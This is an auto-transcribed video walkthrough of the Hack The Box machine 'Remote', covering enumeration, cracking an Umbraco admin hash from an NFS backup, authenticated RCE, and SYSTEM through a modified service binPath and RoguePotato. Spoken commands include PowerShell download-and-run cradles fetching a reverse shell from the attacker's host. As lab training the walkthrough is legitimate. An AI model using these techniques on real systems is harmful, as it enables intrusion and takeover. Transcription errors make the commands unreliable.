 what's going on youtube this is ipsec i'm doing remote from hack the box which was an easy windows box so we'll be doing this one live however these intros are recorded after i've recorded the rest of the video so i know once we start off we're gonna see a bunch of ports open it's got like ftp nfs smb a web service so we do a bunch of light enumeration and eventually find a way to a nfs service that has a website backup that website backup will have a username and password hash that will crack and get authenticated to the website which is called umbraco it's a content management system and there's a authenticated rce out for that application so we'll use that to get a shell on the box and then on the box we'll prives two different ways the very first way we're going to do is through modifying a service that we have full permission of and then the second way is going to be through rogue potato which is the new version of juicy potato so with all that being said let's just jump in as always we're gonna start with the nmap so dash sc for default scripts sv enumerate versions o a output all formats put in the nmap directory and call it remote and then the ip address which is 10 10 10 180 this can take some time to run so i'm going to add the dash v flag so it shows me open ports as it finds them and i'm also going to run nmap with sudo and it doesn't look like it wants to run because the nmap directory is not created so let's add that and restart it right off the bat we have a few ports open we have 135 111 and 139 which are kind of like um maybe rpc ports it's kind of hard to enumerate these ports individually uh 80 is http 21 is ftp 445 is smb and 2049 is nfs so i'm guessing this is going to be a windows box just based upon 445 and these ports being open uh mainly 445 139 and 135 but i'm going to check out ftp first because that's the easiest check to look at manually so ftp 10 1010 180. log in with anonymous password anonymous and we get in i'm going to do a dir dash a and no files there so i'm going to do a touch test and i'm going to try to upload that file uh it's probably put and we get access to night so we can't upload files through ftp and there's no files on this ftp server which is a bit weird don't know exactly the purpose of this right now the reason why i wanted to upload a file is because this also has a web server so if i can upload a shell via ftp i could probably execute it over that web server or i'm assuming it's a web server because port 80 is listening the next thing i want to look at is probably smb shares so i'm going to do crack map exec and i'm checking which version because i have two versions of crack map exec installed i think let's see crack map exec and cme those are the same exact thing always something worth checking because i've made that mistake once when i was installing it manually so cme and crack map exec may be different programs just something to check on your installation uh smb 10 10 10 180 and then i think it's dash dash shares uh i wonder if we can do uh smb h to show modules and then search for share spider share dash dress shares so that's what we want to do so crack map exec smb 10 10 10 180 shares and this is also going to tell us the um os so this is windows 10. uh this build isn't too reliable to determine like patch level because it doesn't get updated that much it is a 64-bit box so that's handy to know and the name and domain is both remote so this most likely is not a domain controller we also know it's not a domain controller because like dns isn't listening signings false and smbv1 is false but we have the hostname which is remote so i'm going to do sudo vi etsy hosts and we can do 10 10 10 180 remote so we have that there um the shares didn't really get anything so i'm going to try a different tool just because it's always handy to have multiple tools check things that you want to look at so smb client dash capital l to with shares 10 10 10 180 and we get access denied i'm also going to do a dash u i think it's capital u with a period and we're just trying to do some type of null authentication to see if that works doesn't look like it works we can try guest and account disabled so probably nothing we can really do over 445 so exit this our nmap is finished so let's just less and map remote dot nmap and see what we have um 21 we knew ftp was allowed 80 is the website we have rpc bind and nfs so we could do show mount let's see rpc and nothing really left so there's really two things we can do we can look at nfs or we can look at http i'm going to start looking at http first just because i can put a bunch of automated tasks looking at the web server while i then look at nfs so let's go take a look at 10 10 10 180 and we get a page welcome to acme and there is no certificate so let's see we see posting dates by 10 uh february 19th 2020. and these looks like maybe tags i don't know exactly how that works we see in the further it says umbraco which is a i think cms a content management system done in net looking at products looking at people so we have a bunch of people which could be handy to um later go and build brute forcing list with i'm going to hit alt f2 just run a program run cherry tree run it and then ctrl n to create a new node remote control shift down to child node people and we're just going to paste come on the next one is going to be devin leopold and jerome brower this formatting got screwed all up oh well and there was one other thing i noticed we have a twitter which is just his first and last name and circuit beard for his instagram so i'm also going to add circuit beard and we'll just move on because we don't have a login or anything yet to do this so going to about us it looks like a lorem ipsum nothing really there contact nothing intranet nothing but that is interesting i'm going to look at the source code and we can confirm it is umbraco so let's start a go buster just to see if we can find any pages so maker girlbuster let's go in here uh go buster der mode dash u http 101010 180 dash w4 list user share word list door buster directory list 2 3 is there a lower case i'm actually going to use a lower case word list because windows web servers are not um uh case sensitive so if we went to people and do p like just mess up all the casing it's still gonna work so we can filter out a lot of the go busting by just killing all case sensitivity so 2 3 medium like this i'm also going to do extension txt because a lot of um application would do like license dot text or readme.txt that will include a version number and then after that there's probably one last thing we should add and that is o for out file we'll just do root dot go buster uh permission what oh i'm in user share word list whatever there we go and if you didn't know when you do cd space dash that goes to previous working directory so with the go buster running let's go and i guess look at a login page and then we'll look at nfs so i'm bronco login page let's see does it say looks like website slash umbraco so website i'm bronco okay so username is usually email so we can try we don't even know the domain um try admin password login failed for admin put some that doesn't exist login failed for that user so right there i was checking if this would tell us if the user exists or not um send it over to burp suite look at what this request looks like it is in json press login doesn't really look like anything we could try to do um a brute force to break our way into this application but we don't know a valid username so um there's really nothing we can do here and it looks like even when we do any type of email it's just gonna say an email was sent so no way to validate valid users on this right now so i'm gonna move over to nfs while the go buster runs and hopefully we'll find something in this nfs share the first tool i'm going to run is show mount dash e to show the export table 10 10 10 180 and if you don't have the show mount um it's part of the nfs common package so you just do apt install nfs common to install it uh there is a site backups directory i'm also going to run show mount dash a 10 10 10 180 and i'm guessing this isn't going to show me anything because it's hacked the box and there's no clients but if we look at man show mount you can see it's going to list the client or ip addresses associated with the mount which is awesome because knowing the clients that are using the mount may give you other ideas for attack like in a linux environment nfs is sometimes used as a home directory server so if you know all the boxes that have that home directory server mounted and the path you maybe will get usernames and if you have access to the nfs server you can get the private key and then know which boxes you can potentially ssh into so knowing who is mounting the server is definitely handy so always run the dash a flag and then dash e is showing you all the mounts on the box so we do have site backups so i'm going to do maker mount slash i guess remote sudo and we'll do sudo mount dash t nfs 10 10 10 180 colon slash site underscore backups and slash mount remote and what this everyone means this means everyone can mount it if you just saw an ip address here that means only that host has ability to mount it or a host name or a range or something so because it's everyone that's what allows us to mount it let's go into mount remote and we can see it looks like the web server so let's cat web.config and see what this is that is a lot of data um grep i version web.config and i was hoping to get like an umbraco version but i don't feel like reading all of this so i don't even know if it exists so we will just ignore that i guess do another ls i'm going to copy web config and then we're going to try to touch test we have permission denied cp that web config over top of it mission id if we can overwrite this web config we could probably um get a code execution but we can't so we'll do find dot dash ls and we'll pipe this over to hb remote web dot der and what that's going to do if we tail dash f web doctor well the command's not done yet but it's going to give us a list of every file and it's going to be locally on our box so it's a bit quicker to browse around so let's go back into mount remote and try taking a look while that runs let's see i'm bronco so anything in here client i'm looking for like a config or something config create gup dash i let's just go grab dash password and config i password here and that gets a lot of hits but we can remove lang because we don't care about language and i guess open yet another window oh nope that one came back so let's take a look at app data on bronco.config is this one different grip-i password improved don't know exactly what that is what is umbraco.sdf i don't know what dot sdf is let's see what is sdf file brocco looks like a database less umbraco sdf strings got a lot so let's see i password crap so we got a username admin hdb.local so let's grab admin whoops admin hdb.local see what we have and right at the top looks like we have a sha-1 hash because we see hash algorithm shot one let's copy this echo-n wc-c 40 characters and that is the same as a shot one hash so we can echo please subscribe sha-1 sum and then echo this and you'll see the booth the same number of kick oh my god echo you can see both the same number of characters there's probably a flag not to have these extra but that's why i wasn't doing wc-c just because it has junk after it so i guess we can there's hashes.org back online yet it is not is it hash killer since just straightshaw1 i'm just going to use some sites first to check it out see come on choose file no alcohol type shot one sum you can tell how often i use these sites i'm just gonna paste it google and we can get the password is bacon and cheese if you wanted to use hash cat um hell uh example hashes depth si sha1 there's a lot of that so i dash b for before three shot one is a hundred so if we just do the word list bacon and cheese not the password please sub v not wordless now um ashes let's go back we pasted it here and then hashcat dash m100 word list is hashes like this and dash f for force or is it dash dash force and you can see that's how you crack a shot one hash the reason why i used a small dictionary file is because i was using this dash dash force flag and you should never give hash cat a lot of work to do when you're not using a gpu that's why normally i ssh into a box called the kraken because that's where i have a graphics card that can use for cracking however that box is currently offline so that's why i was doing it all on my vm so with the has password bacon and cheese we can now potentially log into umbraco so let's do admin at what was the username it was like hack the box dot something admin hdb.local and the password is bacon and cheese so let's login admin hdb.local bacon and cheese and it's taking its sweet time to log in come on wonder if we have to refresh admin bacon and cheese yeah for some reason i want us to refresh probably because i had disabled between the two so now we're on the web server uh i'm going to check search point to see if there's any exploits from bronco search point umbraco and there is a remote authenticated command execution so let's take a look at this search point x oh like that and it wants well its date is 2000 january 1st 7 12 4. so let's go back into the web config grep i 7.12 and we can see on bronco configuration status is this exact version so we should be good to go so let's see what this is doing login password host so this is xml c sharp string command i'm guessing we have to put a command here uh start file name is calc probably don't want that okay so let's do search point dash m to mirror and edit the script so first thing we have to do is put the login admin hdb dot local password is bacon and cheese and the hearst is 10 10 10 180. i don't know the difference between this proc start info file name and string cmd we'll treat the string cmd as like arg v so just do c ping 10 10 14 2 and then this will be the program we're executing so hopefully these two get joined together and it does cmd.exe slash c ping1010142 guessing if i read more of this i'd get that so let's save this and then do sudo tcp dump dash i ton zero dash v oh god uh icmp dash v and run this no schema perhaps you meant okay so i think it wants a http before this http colon slash run and we get some pings and this is windows so we should only get four hopefully it stops and it does so we have code execution so let's make dirt dub dub dub it's been a while since we did this windows reverse shell uh opt do i have no shang find slash opt i i know it's in user share cp user share machine shells invoke what is it we'll do powershell tcp dot ps1 we'll just call this rev.ps1 okay and we want a reverse shell so we'll just take this example put down the very bottom and then replace the ip address so 10 10 14 2 and the port will do 9001 so let's start a web server so python 3 dash m http dot server and then what we want to do is start a web shell so nc lvmp 9001 and then we go back up here and i'm going to change this to powershell and as i do that i realize exactly how this is working so we have proc.dirt info.filename powershell.exe and then we're giving it the argument cmd and then we're just executing it so definitely works exactly how we thought um i'm not going to do the iex new object method instead i'm going to do iex iwr which is invoke web request http 10 10 14 2. uh we did what do we call it um rev.ps1 and we'll do use i think basic person is how this one works it's just a slightly different shell that involves less typing if it doesn't work then we will switch and use the other one but right off the bat i realized i did not put port 8000 in this invoke web request and it doesn't look like it oh nope it hit and we got a connection and a shell so there we go um the other one i'm sure you know uh it's ix new object net.web client download string http 10 10 14 2 8 000 slash rev ps1 and that does essentially the same exact thing as the invoke web request except um avs really stopped liking this new object net.web client so i have more luck with the invoke web request method so that's the only reason i used used it so let's do dir okay who am i slash all and what privileges do we have we do have essie impersonate but this is a probably newer version of windows 10 so standard juicy potato won't work um since this box came out there's been a new program called rogue potato that i haven't actually used so maybe we'll try that at the very end of the video however rogue potato came out after this box so i'm not going to start off with that uh let's do ftp transfer is there anything actually in here there is not uh site backups this looks like the directory we had access to the that i thought was um inet pub the home directory of the web server but looks like that's just the nfs go into users uh let's see administrator can't access so let's try doing a private i'm guessing the user.txt is probably in public desktop there it is there's used our text if you wanted it but let's run win peace so i'm going to go to opt privilege lower case it's been a while since i've ran this so i'm just going to do a git pull to update and then let's go to win peas winpees.exe win peas bin x64 release and we finally got to the exe so win ps exe copy it to hdb remote and then what was the directory dub dub dub and let's just put in public documents iwr http 10 10 14 2 port 8000 slash win ps dot exe i think it's out file win ps.exe and let's go back to our directory and run the web server did it download it looks like it did so let's try executing winpeez.exe and it's taking a long time which is definitely a good sign uh maybe it's not dot backslash when ps.exe if this doesn't work i'll try dot slash it's taking a long time which may or may not be a good sign i'm guessing it is just working its magic right now so there is other tools out there um i recently came across this github reaper called sharp collection i think which is amazing so if you hated compiling.net tools like i did uh just the sharp collection thing has a bunch of things when you compile your own.net it's less likely to be picked up by um amsi but for like hack the box learning and just playing with tools this repo is a gold mine and it looks like win peas has finished so let's take a look at what we can do i'll get right potato later so let's see os build looks like we got a few things what is sharp by bear i have no idea what this one is should buy let's see music [Music] maybe we'll look at that after this let's go through all of this to see if there's anything interesting and the reason why i'm not hurting on that um any type of like os exploit that's generally the last thing i do i like looking for misconfigurations or things like that first just because they're more reliable when you screw up with a west level exploit chances are you can really hose the box and screw with things so you process information just going down looking at the red looks like we can modify some services uso svc we have all access so that one stands out for some reason i'm just going to go over here and make a note of it come on where is uso svc just so i remember that oh no uh lost my place uso svc scrolling we don't have anything but i'm thinking more it said all access so i was thinking we could just start it but we can modify this service so we can just change the binary path of this service and execute it which i'm guessing is what this is going to tell us to do we can go to the book.hacktricks.xyz and sc say permissions get a list yep enable and modify so sc config service name bin path so let's try playing with this um since we're in a powershell shell um sc is actually alias to like set content or something so anytime you want to do sc you have to do sc exe i've been bitten by that so many times uso svc we can see it's running we can do sc.exe config uso svc does it give us the config it does not but um i'm actually going to redo my shell because i want the up arrow so let's exit out of this i'm going to do script reverse dot psr dot log and then uh rlwrap i think sudo let's exit the script because i don't have rl wrap installed sudo apt install rl wrap and that stands for read line wrap which will just give me the ability to do up and down in a window shell so once this finishes i always hate how long it takes for the processing trigger man page to finish so script reverse dot log this is going to set up um a log file on our box giving us all the input and output logging and then i'm going to do rlwrap nclvmp and we're going to get our reverse shell again and we'll take a second and let's go back to users public documents and we'll do sc.exe config bin path equals i think that's how it was yep and then we'll do powershell.exe i wonder if we can just do iwr this way iwrhtp101010 all right 10 10 14 2 port 8000 slash rev.ps1 and then use basic parsing i don't know if we can do it this way uh sc config we didn't do uso svc okay sc.exe stop uso svc and then we'll start it but before we do listen on 9001 and it doesn't look like that worked so i'm going to get rid of the single quotes we'll try it doesn't look like that worked either so let's do a powershell encoder command so echo we wanted ix and then iwr http 1010142 port 8000 rev.ps1 then use basic parsing and i convert to utf i think it's dash 16 little endian and then base64 w zero i think this gives us a powershell encoded command so we'll try this way so we'll do powershell.exe dash encoded command paste start and it's still not working so let's try path is equal to cmd.exe c powershell start and it looks like it worked that way for some reason it just didn't want powershell.exe to be the um thing so maybe powershell is not in the path but now we have nt authority system and we can go that and go into desktop and we could get root.text if we wanted to so there's the box doing it that way um let's go and play with uh rogue potato and see what this does let's go back to firefox and see if it's in sharp collection it does not look like it is so i'm going to google rogue potato github go to the first result and then it looks like they have a release so let's just try running this save it and we can do cp downloads rogue potato unzip it and let's move both of those to dub dub dub and then we'll download both of them here so iwr htp 10 10 14 2 port 8 000 roguepotato.exe o roguepotato.exe then we want to do the oxid resolver not positive if we have to do this but for the first time running it would probably help and maybe it's out foul not o it looks like it works thank god so let's see full details at this let's see does he just have screenshots of it working so slash c rogue potato dash rip so we'll do dot backslash roguepotato.exe then dashr1010142 and then dash e is the command so dash e we'll do cmd.exe c powershell dash encoded command and let's grab this like that and dash l qua nines see what happens i don't have high hopes because i've never ran this tool before but said i would so let's try it uh namepipe didn't receive a response exiting so maybe this is due to the cls id and does rogue potato have something to check that don't believe it does so i may have to do a separate video on this technique once i look at it more but if you looked at juicy potato they had a cls cls id thing i wonder if we can just replace it juicy potato cls id because these numbers probably didn't change see windows 10 and we'll try well we know uso's on it we'll try this dash c that maybe we need did it not like it dash i would do dash c put in quotes i missed one quote oh shoot i don't have i think that just worked i don't have neck cat running but i see a get to rev.ps1 who am i and tier 30 system so let's try doing it without that cls id had it worked i'm guessing it didn't because i don't think i remember it hitting rev.ps1 yeah it did not so by sheer luck guessing that we should use this cls id we had it i'm sure there's plenty of other ones that work um the default is i think bit svc which is like bits admin which is um being removed uh we could try let's just try and install it like this see how many we can get real quick so delete all this paste i have an extra space there shoot come on give me my command back let that run that man i'm just gonna see if there's another host i recognize that would probably be a good one so many of them bits let's just try upnp host and then i'm going to look at the sharp bear thing and then we'll call it a video but happy i got the rogue potato working with very little prep i actually did not expect that to work i have double brackets and i'm think it was in the fighter video that i use juicy potato and have a way to enumerate all cls ids to give you a list of what ones work or not but yeah that's that um i'm going to search for bear and let's take a look at this repo a bit more to see what this exploit is oh i had it over here let's see race condition and app svc oh we won't be able to do this because uh by targeting you have to open edge mainly after you do the exploit to trigger the race condition for katana you have to click on the search menu on the lower left so we can't do either those because we don't have a desktop so can't really do that uh we could go through all these cbes but i'm sure some would work some wouldn't i recommend you check it out yourself and hope you guys enjoy the video take care and i will see you all next week